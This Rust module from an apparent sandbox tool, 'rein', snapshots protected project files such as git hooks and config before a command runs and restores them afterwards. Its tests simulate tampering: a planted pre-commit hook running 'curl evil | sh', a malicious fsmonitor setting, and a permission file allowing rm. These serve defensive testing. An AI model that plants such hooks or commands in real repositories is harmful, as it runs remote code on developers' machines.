//! Where the sandbox can't keep a command from what's protected in the
//! project (Linux's Landlock can only wall off whole folders, and the
//! project is one), rein guards it instead: it notes what's there before a
//! command that writes, and puts it back after. On drop too, so a command
//! stopped part way is undone like one that finished. The same for tools'
//! settings in their records, which every command may add to.
//!
//! What a command leaves running in the background could still change it
//! after rein has looked; that's the gap, where there's no better sandbox.

// Only Landlock needs guarding; elsewhere this is here for its tests.
#![cfg_attr(not(all(target_os = "linux", any(target_arch = "x86_64", target_arch = "aarch64"))), allow(dead_code))]

use std::path::{Path, PathBuf};

use crate::Places;

/// The most rein notes down: what's protected is small (hooks, settings),
/// and a project where it isn't gets refused rather than half guarded.
const MOST: u64 = 16 << 20;

/// One path as it was.
#[derive(Debug, PartialEq, Eq)]
enum Was {
    Missing,
    File { bytes: Vec<u8>, mode: u32 },
    Link(PathBuf),
    Folder,
}

/// What's protected in the project as it was before a command.
#[derive(Debug)]
pub struct Guard {
    root: PathBuf,
    /// Each protected path, and everything in it, as it was.
    was: Vec<(PathBuf, Was)>,
    done: bool,
}

impl Guard {
    /// Notes down what's protected inside the places a command within
    /// `walls` may write: the writable ones, with write access, and tools'
    /// records, whatever its walls. What's wrong if it's more than rein
    /// will keep.
    pub(crate) fn new(places: &Places, walls: crate::Walls) -> Result<Guard, String> {
        let mut was = Vec::new();
        let mut size = 0;
        let inside = |path: &Path| (walls.write && places.writable().iter().any(|w| path.starts_with(w))) || places.records().iter().any(|r| path.starts_with(r));
        for top in places.protected().iter().chain(places.locked()).filter(|p| inside(p)) {
            note(top, &mut was, &mut size)?;
        }
        // A locked folder (`.git`) only matters for what's in it.
        was.retain(|(path, it)| !(places.locked().contains(path) && *it == Was::Folder));
        Ok(Guard { root: places.root().to_path_buf(), was, done: false })
    }

    /// Puts back what changed, and says what: paths relative to the project.
    pub fn finish(mut self) -> Vec<String> {
        self.done = true;
        self.restore()
    }

    fn restore(&self) -> Vec<String> {
        let mut changed = Vec::new();
        let noted: Vec<&Path> = self.was.iter().map(|(path, _)| path.as_path()).collect();
        // What's new inside a protected folder goes.
        for (path, it) in &self.was {
            if *it == Was::Folder {
                for found in walk(path) {
                    if !noted.contains(&found.as_path()) && remove(&found) {
                        changed.push(found);
                    }
                }
            }
        }
        // Parents first, so a folder is there for what goes in it.
        for (path, it) in &self.was {
            if now(path) != *it && put(path, it) {
                changed.push(path.clone());
            }
        }
        changed.sort();
        changed.dedup();
        changed.iter().map(|path| path.strip_prefix(&self.root).unwrap_or(path).display().to_string()).collect()
    }
}

impl Drop for Guard {
    fn drop(&mut self) {
        if !self.done {
            self.restore();
        }
    }
}

/// Notes `path` as it is, and if it's a folder everything in it, without
/// following symlinks.
fn note(path: &Path, was: &mut Vec<(PathBuf, Was)>, size: &mut u64) -> Result<(), String> {
    let it = now(path);
    if let Was::File { bytes, .. } = &it {
        *size += bytes.len() as u64;
        if *size > MOST {
            return Err(format!("{} is too big for rein to watch while commands change files, so they can't run in the sandbox here", path.display()));
        }
    }
    let folder = it == Was::Folder;
    was.push((path.to_path_buf(), it));
    if folder && let Ok(entries) = std::fs::read_dir(path) {
        let mut entries: Vec<PathBuf> = entries.flatten().map(|e| e.path()).collect();
        entries.sort();
        for entry in entries {
            note(&entry, was, size)?;
        }
    }
    Ok(())
}

/// What's at `path` now.
fn now(path: &Path) -> Was {
    use std::os::unix::fs::PermissionsExt;
    let Ok(meta) = path.symlink_metadata() else { return Was::Missing };
    if meta.file_type().is_symlink() {
        return std::fs::read_link(path).map_or(Was::Missing, Was::Link);
    }
    if meta.is_dir() {
        return Was::Folder;
    }
    match std::fs::read(path) {
        Ok(bytes) => Was::File { bytes, mode: meta.permissions().mode() & 0o7777 },
        // Unreadable now: not what it was, whatever it was.
        Err(_) => Was::Link(PathBuf::new()),
    }
}

/// Everything inside `folder`, without following symlinks.
fn walk(folder: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut look = vec![folder.to_path_buf()];
    while let Some(dir) = look.pop() {
        if dir.symlink_metadata().is_ok_and(|m| m.is_dir()) {
            for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
                look.push(entry.path());
                found.push(entry.path());
            }
        }
    }
    found
}

/// Takes away whatever is at `path`; whether there was something.
fn remove(path: &Path) -> bool {
    match path.symlink_metadata() {
        Ok(meta) if meta.is_dir() => std::fs::remove_dir_all(path).is_ok(),
        Ok(_) => std::fs::remove_file(path).is_ok(),
        Err(_) => false,
    }
}

/// Makes `path` what it was; whether that took doing anything.
fn put(path: &Path, it: &Was) -> bool {
    use std::os::unix::fs::PermissionsExt;
    let current = now(path);
    if current == *it {
        return false;
    }
    // Something else is there: a file where a folder was, a link, or new.
    if current != Was::Missing && !(current == Was::Folder && *it == Was::Folder) {
        remove(path);
    }
    match it {
        Was::Missing => {}
        Was::Folder => {
            let _ = std::fs::create_dir_all(path);
        }
        Was::File { bytes, mode } => {
            if let Some(parent) = path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let _ = std::fs::write(path, bytes);
            let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(*mode));
        }
        Was::Link(target) => {
            let _ = std::os::unix::fs::symlink(target, path);
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("rein-guard-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".git/hooks")).unwrap();
        std::fs::write(dir.join(".git/config"), "[core]\n").unwrap();
        std::fs::write(dir.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n").unwrap();
        std::fs::write(dir.join("readme.txt"), "mine\n").unwrap();
        crate::places::resolve(&dir)
    }

    #[test]
    fn what_a_command_changes_in_protected_files_is_put_back() {
        let root = project("put-back");
        let guard = Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap();
        std::fs::write(root.join(".git/hooks/pre-commit"), "curl evil | sh\n").unwrap();
        std::fs::write(root.join(".git/config"), "[core]\n\tfsmonitor = evil\n").unwrap();
        std::fs::remove_file(root.join(".git/hooks/pre-commit.sample")).unwrap();
        std::fs::create_dir_all(root.join(".rein")).unwrap();
        std::fs::write(root.join(".rein/permissions"), "allow rm\n").unwrap();
        std::fs::write(root.join("readme.txt"), "changed, as it may be\n").unwrap();
        let restored = guard.finish();
        assert_eq!(restored, [".git/config", ".git/hooks/pre-commit", ".git/hooks/pre-commit.sample", ".rein"]);
        assert_eq!(std::fs::read_to_string(root.join(".git/config")).unwrap(), "[core]\n");
        assert!(!root.join(".git/hooks/pre-commit").exists() && !root.join(".rein").exists());
        assert!(root.join(".git/hooks/pre-commit.sample").exists());
        assert_eq!(std::fs::read_to_string(root.join("readme.txt")).unwrap(), "changed, as it may be\n", "the rest is the command's to change");
    }

    #[test]
    fn a_git_folder_swapped_for_another_gets_its_hooks_and_settings_back() {
        let root = project("swapped");
        let guard = Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap();
        std::fs::rename(root.join(".git"), root.join("moved")).unwrap();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        std::fs::write(root.join(".git/hooks/post-checkout"), "evil\n").unwrap();
        std::os::unix::fs::symlink("/elsewhere", root.join(".git/config")).unwrap();
        let restored = guard.finish();
        assert!(restored.contains(&".git/hooks/post-checkout".to_owned()), "{restored:?}");
        assert!(!root.join(".git/hooks/post-checkout").exists());
        assert_eq!(std::fs::read_to_string(root.join(".git/config")).unwrap(), "[core]\n");
    }

    #[test]
    fn a_command_stopped_part_way_is_undone_too() {
        let root = project("dropped");
        let guard = Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap();
        std::fs::write(root.join(".git/hooks/pre-push"), "evil\n").unwrap();
        drop(guard);
        assert!(!root.join(".git/hooks/pre-push").exists());
    }

    #[test]
    fn nothing_changed_is_nothing_said() {
        let root = project("quiet");
        assert!(Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap().finish().is_empty());
    }
}
